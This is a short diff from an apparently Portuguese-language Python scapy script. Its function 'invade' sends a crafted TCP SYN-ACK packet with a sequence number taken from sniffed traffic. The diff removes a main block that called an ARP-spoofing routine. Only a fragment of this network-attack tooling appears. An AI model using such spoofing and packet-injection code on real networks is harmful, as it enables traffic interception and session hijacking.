@@ -69,8 +69,3 @@ def invade(interface):
     TCP = scapy.TCP(sport=3333, dport=sport, flags='SA', seq=3030, ack=resposta_sniff[0].seq + 1)
     pacote_syn_ack = IP/TCP
     scapy.send(pacote_syn_ack, verbose=0)
-
-if __name__ == "__main__":
-    interface = configs_pc.interface()
-    mac_local = configs_pc.end_mac()
-    arp_spoofing(interface, mac_local)
